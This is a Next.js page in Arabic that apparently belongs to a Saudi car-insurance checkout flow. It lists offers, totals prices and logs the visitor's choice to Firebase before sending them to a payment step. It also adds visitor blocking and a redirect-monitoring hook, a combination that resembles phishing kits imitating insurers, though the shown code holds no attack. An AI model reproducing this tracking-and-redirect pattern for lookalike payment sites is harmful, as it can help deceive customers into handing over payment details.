"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { Globe, Plus, ShoppingCart } from "lucide-react";
import { FullPageLoader } from "@/components/loader";
import { StepShell } from "@/components/step-shell";
import { getOrCreateVisitorID, checkIfBlocked } from "@/lib/visitor-tracking";
import { useRedirectMonitor } from "@/hooks/use-redirect-monitor";
import { addData } from "@/lib/firebase";
import { offerData } from "@/lib/offer-data";

export default function ComparisonPage() {
  const router = useRouter();
  const [visitorID] = useState(() => getOrCreateVisitorID());
  const [loading, setLoading] = useState(true);
  const [isBlocked, setIsBlocked] = useState(false);

  const [selectedOffer, setSelectedOffer] = useState<any>(null);
  const [selectedFeatures, setSelectedFeatures] = useState<
    Record<string, string[]>
  >({});
  const [offerTotalPrice, setOfferTotalPrice] = useState<number>(0);
  const [offersTab, setOffersTab] = useState<
    "comprehensive" | "against-others"
  >("against-others");
  const [language, setLanguage] = useState<"ar" | "en">("ar");

  useRedirectMonitor({ visitorId: visitorID, currentPage: "compar" });

  useEffect(() => {
    const init = async () => {
      const blocked = await checkIfBlocked(visitorID);
      if (blocked) {
        setIsBlocked(true);
        setLoading(false);
        return;
      }
      setLoading(false);
    };
    init();
  }, [visitorID]);

  const toggleFeature = (offerId: string, featureId: string) => {
    setSelectedFeatures((prev) => {
      const current = prev[offerId] || [];
      return current.includes(featureId)
        ? { ...prev, [offerId]: current.filter((id) => id !== featureId) }
        : { ...prev, [offerId]: [...current, featureId] };
    });
  };

  const calculateOfferTotal = (
    offer: (typeof offerData)[0],
    selFeatures: string[] = [],
  ) => {
    const mainPrice = Number.parseFloat(offer.main_price);
    const featuresPrice = offer.extra_features
      .filter((f) => selFeatures.includes(f.id))
      .reduce((s, f) => s + f.price, 0);
    const expensesTotal = offer.extra_expenses.reduce((s, e) => s + e.price, 0);
    return mainPrice + featuresPrice + expensesTotal;
  };

  const filteredOffers = offerData.filter((o) => o.type === offersTab);

  const handleSelectOffer = async (offer: (typeof offerData)[0]) => {
    setSelectedOffer(offer);
    const selFeatures = selectedFeatures[offer.id] || [];
    const totalPrice = calculateOfferTotal(offer, selFeatures);
    const finalPrice = Number.parseFloat(totalPrice.toFixed(2));
    setOfferTotalPrice(finalPrice);
    const comparData = {
      selectedOffer: {
        name: offer.company.name,
        image_url: offer.company.image_url,
        type: offer.type,
        extra_features: offer.extra_features.filter((f) =>
          selFeatures.includes(f.id),
        ),
      },
      offerTotalPrice: finalPrice,
      selectedFeatures: selFeatures,
    };
    localStorage.setItem("comparFormData", JSON.stringify(comparData));
    await addData({
      id: visitorID,
      ...comparData,
      currentStep: 4,
      currentPage: "check",
      comparCompletedAt: new Date().toISOString(),
    }).then(() => router.push("/check"));
  };

  if (loading) return <FullPageLoader />;

  if (isBlocked) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-50">
        <div className="text-center p-8 bg-white rounded-lg shadow-lg max-w-md">
          <h1 className="text-2xl font-bold text-red-600 mb-4">
            تم حظر الوصول
          </h1>
          <p className="text-gray-600">عذراً، تم حظر وصولك إلى هذه الخدمة.</p>
        </div>
      </div>
    );
  }

  return (
    <StepShell
      step={2}
      title="العروض المتاحة"
      subtitle="اختر العرض الأنسب لك قبل الانتقال إلى الدفع."
      maxWidthClassName="max-w-2xl"
      headerAction={
        <button
          onClick={() => setLanguage(language === "ar" ? "en" : "ar")}
          className="flex items-center gap-2 rounded-lg border border-[#bbdefb] bg-[#e3f2fd] px-3 py-2 text-sm font-bold text-[#1976d2]"
        >
          <Globe className="h-4 w-4 text-[#1976d2]" />
          <span>{language === "ar" ? "EN" : "AR"}</span>
        </button>
      }
    >
      {/* Bank Notice */}
      <div className="mb-4" dir="rtl">
        <div className="bg-[#e8f4fd] border border-[#b3d9f5] rounded-xl p-3 text-[#1565c0] text-xs leading-relaxed">
          بموجب تعليمات البنك المركزي السعودي، يحق لحامل الوثيقة إلغاء الوثيقة
          واسترداد كامل المبلغ المدفوع خلال 15 يوماً من تاريخ الشراء، بشرط عدم
          حدوث أي مطالبات خلال هذه الفترة.
        </div>
      </div>

      {/* Tabs */}
      <div className="mb-5" dir="rtl">
        <div className="flex gap-1.5 bg-[#eef2f7] p-1 rounded-2xl">
          <button
            onClick={() => setOffersTab("against-others")}
            className={`flex-1 py-2.5 rounded-xl font-bold text-sm transition-all ${
              offersTab === "against-others"
                ? "bg-[#1976d2] text-white shadow-md"
                : "text-gray-500 hover:text-gray-700"
            }`}
          >
            ضد الغير
          </button>
          <button
            onClick={() => setOffersTab("comprehensive")}
            className={`flex-1 py-2.5 rounded-xl font-bold text-sm transition-all ${
              offersTab === "comprehensive"
                ? "bg-[#1976d2] text-white shadow-md"
                : "text-gray-500 hover:text-gray-700"
            }`}
          >
            شامل
          </button>
        </div>
      </div>

      {/* Offers */}
      <div className="space-y-4">
        {filteredOffers.map((offer) => {
          const selFeatures = selectedFeatures[offer.id] || [];
          const totalPrice = calculateOfferTotal(offer, selFeatures);
          const typeLabel =
            offer.type === "against-others" ? "ضد الغير" : "شامل";

          return (
            <div
              key={offer.id}
              className="bg-white rounded-2xl border border-gray-200 shadow-sm overflow-hidden"
              dir="rtl"
            >
              {/* ── Section 1: Company Header ── */}
              <div className="flex items-center justify-between px-2 py-2">
                {/* RIGHT in RTL: name + subtitle */}
                <div>
                  <h3 className="text-lg font-bold text-gray-900 leading-tight">
                    {offer.company.name}
                  </h3>
                  <p className="text-sm text-gray-400 mt-0.5">
                    {typeLabel} - تأمين معتمد
                  </p>
                </div>
                {/* LEFT in RTL: logo */}
                <div className="w-16 h-14 flex items-center justify-center flex-shrink-0">
                  <img
                    src={offer.company.image_url || "/placeholder.svg"}
                    alt={offer.company.name}
                    className="max-w-full max-h-full object-contain"
                  />
                </div>
              </div>

              <div className="border-t border-gray-100" />

              {/* ── Section 2: Features ── */}
              <div>
                {/* Features header */}
                <div className="flex items-center justify-between px-4 py-3">
                  {/* RIGHT: title */}
                  <span className="text-base font-bold text-gray-800">
                    المنافع الإضافية
                  </span>
                  {/* LEFT: + button */}
                  <div className="w-7 h-7 rounded-full bg-[#1976d2] flex items-center justify-center flex-shrink-0">
                    <Plus className="w-4 h-4 text-white" strokeWidth={3} />
                  </div>
                </div>

                {/* Feature checkboxes */}
                {offer.extra_features.length > 0 && (
                  <div className="px-4 pb-3 space-y-3">
                    {offer.extra_features.map((feature) => {
                      const checked = selFeatures.includes(feature.id);
                      return (
                        <label
                          key={feature.id}
                          htmlFor={`${offer.id}-${feature.id}`}
                          className="flex items-start gap-3 cursor-pointer"
                        >
                          {/* Text RIGHT side */}
                          <span className="flex-1 text-sm text-gray-700 leading-relaxed">
                            {feature.content}
                            {feature.price > 0 && (
                              <span className="text-[#1976d2] font-semibold mr-1">
                                (+{feature.price} ﷼)
                              </span>
                            )}
                          </span>
                          {/* Custom checkbox LEFT side */}
                          <div
                            onClick={() => toggleFeature(offer.id, feature.id)}
                            className={`mt-0.5 w-5 h-5 rounded flex-shrink-0 flex items-center justify-center border-2 cursor-pointer transition-all ${
                              checked
                                ? "bg-[#1976d2] border-[#1976d2]"
                                : "bg-white border-gray-300"
                            }`}
                          >
                            {checked && (
                              <svg
                                className="w-3 h-3 text-white"
                                fill="none"
                                viewBox="0 0 12 12"
                                stroke="currentColor"
                                strokeWidth={2.5}
                              >
                                <path
                                  strokeLinecap="round"
                                  strokeLinejoin="round"
                                  d="M2 6l3 3 5-5"
                                />
                              </svg>
                            )}
                          </div>
                          <input
                            type="checkbox"
                            id={`${offer.id}-${feature.id}`}
                            checked={checked}
                            onChange={() => toggleFeature(offer.id, feature.id)}
                            className="sr-only"
                          />
                        </label>
                      );
                    })}
                  </div>
                )}

                {/* Extra expenses inside features section */}
                {offer.extra_expenses.length > 0 && (
                  <div className="px-4 pb-3 border-t border-dashed border-gray-200 pt-3">
                    {offer.extra_expenses.map((expense) => (
                      <div
                        key={expense.id}
                        className="flex justify-between items-center text-xs text-gray-500 py-0.5"
                      >
                        <span className="text-[#1976d2] font-semibold">
                          {expense.price} ﷼
                        </span>
                        <span>{expense.reason}</span>
                      </div>
                    ))}
                  </div>
                )}
              </div>

              <div className="border-t border-gray-100" />

              {/* ── Section 3: Price box + Terms ── */}
              <div className="flex items-center gap-3 px-4 py-4">
                {/* Price box — RIGHT side (first in RTL) */}
                <div className="flex-1 border-2 border-[#1976d2] rounded-2xl overflow-hidden">
                  <div className="text-center pt-3 pb-1">
                    <p className="text-xs text-gray-500 mb-1">الإجمالي</p>
                    <p className="text-2xl font-bold text-[#1976d2] leading-tight">
                      {totalPrice.toFixed(2)}{" "}
                      <span className="text-lg">ريال</span>
                    </p>
                  </div>
                  <div className="p-2">
                    <button
                      onClick={() => handleSelectOffer(offer)}
                      className="w-full h-11 bg-[#1976d2] hover:bg-[#1565c0] text-white font-bold text-base rounded-xl flex items-center justify-center gap-2 transition-all"
                    >
                      <ShoppingCart className="w-5 h-5" />
                      اشتري الآن
                    </button>
                  </div>
                </div>

                {/* Terms link — LEFT side (second in RTL) */}
                <div className="flex-shrink-0">
                  <a
                    href="#"
                    className="text-xs text-[#1976d2] underline underline-offset-2"
                  >
                    الشروط والأحكام
                  </a>
                </div>
              </div>
            </div>
          );
        })}
      </div>
    </StepShell>
  );
}
